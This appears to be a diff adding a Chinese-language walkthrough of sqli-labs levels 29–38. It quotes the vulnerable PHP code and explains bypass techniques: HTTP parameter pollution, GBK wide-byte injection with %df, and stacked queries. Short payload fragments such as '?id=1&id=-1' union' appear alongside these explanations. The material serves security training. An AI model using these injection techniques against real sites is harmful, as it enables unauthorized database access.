+	&lt;span class=&#34;c1&#34;&gt;# 以&amp;#39;&amp;amp;&amp;#39;为分隔符分割字符串
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nv&#34;&gt;$qs_array&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$q_s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+	&lt;span class=&#34;c1&#34;&gt;# 遍历分割好的参数数组
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$qs_array&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;c1&#34;&gt;# 如果前两位是id
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        	&lt;span class=&#34;c1&#34;&gt;# 从第3位开始，返回长度为30的字符穿
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;			&lt;span class=&#34;nv&#34;&gt;$id_value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
+			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;分析-1&#34;&gt;分析&lt;/h3&gt;
+&lt;p&gt;流程：服务端获取到查询字符串&lt;code&gt;id=1&amp;amp;...&lt;/code&gt;，随后截取参数id的值用于白名单过滤，如果匹配数字则继续执行，否则重定向到失败页面&lt;/p&gt;
+&lt;p&gt;但是问题出在以下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用于sql查询的id值是通过GET方式获取的，该服务端默认认为从GET方式获取的id值与用于解析白名单过滤的id值是同一个&lt;/li&gt;
+&lt;li&gt;对于&lt;code&gt;xxx.php?id=1&amp;amp;id=2&lt;/code&gt;这样的同名参数污染，apache PHP会解析获取最后一个参数值，即为2；tomcat JSP会解析获取到第一个参数值，即为1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此，利用方式如下：?id=1&amp;amp;id=-1&amp;rsquo; union&amp;hellip;..&lt;/p&gt;
+&lt;h2 id=&#34;less-30&#34;&gt;Less-30&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-29一致&lt;/p&gt;
+&lt;h2 id=&#34;less-31&#34;&gt;Less-31&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-29一致&lt;/p&gt;
+&lt;h2 id=&#34;less-32&#34;&gt;Less-32&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;c1&#34;&gt;# 转义\
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\\\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;# 转义单引号
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/\&amp;#39;/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   
+    &lt;span class=&#34;c1&#34;&gt;# 转义双引号
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/\&amp;#34;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                               
+      
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SET NAMES gbk&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;绕过-3&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;使用 GBK 编码MySQL会认为两个字节为一个汉字，例如 &lt;code&gt;%aa%5e&lt;/code&gt; 即为一个 汉字&lt;/p&gt;
+&lt;p&gt;由于转义是在敏感字符前加&lt;code&gt;\&lt;/code&gt;，&lt;code&gt;\&#39;&lt;/code&gt;即%5c%27，那可以在&lt;code&gt;\&#39;&lt;/code&gt;前加上%df，转义后结果为：&lt;code&gt;%df\\\&#39;&lt;/code&gt;，这样MySQL使用GBK会认为%df%5c为一个汉字，即为&lt;code&gt;汉字\\&#39;&lt;/code&gt;，则汉字后的两个反斜杠实际在送往sql语句时表示的仅仅只是一个单纯的反斜杠，不再具有转义作用，此时单引号便起到了闭合作用&lt;/p&gt;
+&lt;h2 id=&#34;less-33&#34;&gt;Less-33&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转义方法与Less-32类似&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;绕过方式与Less-32一致&lt;/p&gt;
+&lt;h3 id=&#34;补充&#34;&gt;补充&lt;/h3&gt;
+&lt;p&gt;gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;MySQL编码机制&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;character_set_client：用户告诉MySQL查询是用的什么字符集。
+character_set_connection：MySQL接收到用户查询后，按照character_set_client将其转化为character_set_connection设定的字符集
+character_set_results：MySQL将存储的数据转换成character_set_results所设定的字符集发送给用户&lt;/p&gt;
+&lt;p&gt;完整可理解为：&lt;strong&gt;MySQL接受到客户端的数据后，会认为他的编码是character_set_client，然后会将换成character_set_connection的编码，然后在进入具体表和字段后，再转换成字段对应的编码，当查询结果产生后，会从表和字段编码转换成character_set_results编码，返回给客户端&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less-34&#34;&gt;Less-34&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-33类似&lt;/p&gt;
+&lt;h2 id=&#34;less-35&#34;&gt;Less-35&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;直接拼接&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;虽然有转义过滤，但是sql语句是直接拼接，所以不需要引号闭合等&lt;/p&gt;
+&lt;h2 id=&#34;less-36&#34;&gt;Less-36&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_quotes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-33的过滤方式类似，绕过方法类似&lt;/p&gt;
+&lt;h2 id=&#34;less-37&#34;&gt;Less-37&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-36类似&lt;/p&gt;
+&lt;h2 id=&#34;less-38堆叠注入&#34;&gt;Less-38(堆叠注入)&lt;/h2&gt;
+&lt;h3 id=&#34;堆叠&#34;&gt;堆叠&lt;/h3&gt;
+&lt;p&gt;多条语句一起执行&lt;/p&gt;
+&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
+&lt;p&gt;MySQL 中，主要是命令行中，每条语句结尾加 &lt;code&gt;;&lt;/code&gt; 表示语句结束。这样可以考虑闭合已有语句，从而执行多条 SQL 语句&lt;/p&gt;
+&lt;p&gt;注意&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;UNION 执行的语句类型是有限的—查询语句；而堆叠注入可以执行任意语句&lt;/p&gt;
+&lt;p&gt;并不是每一个环境下都可以执行堆叠，很可能受 API 、数据库引擎不支持、权限不足的限制&lt;/p&gt;
+&lt;p&gt;在真实环境中通常只返回一个查询结果，因此，堆叠注入第二个语句可能产生错误或者结果被忽略，即在前端界面是无法看到返回结果的；在使用堆叠注入之前需要知道一些数据库相关信息的，例如表名，列名等信息&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_multi_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 执行多个查询有结果
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;cm&#34;&gt;/* store first result set */&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_store_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_fetch_row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;font size = &amp;#34;5&amp;#34; color= &amp;#34;#00FF00&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	
+            &lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Your Username is : %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Your Password is : %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/font&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;//            mysqli_free_result($result);
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+        &lt;span class=&#34;cm&#34;&gt;/* print divider */&lt;/span&gt;
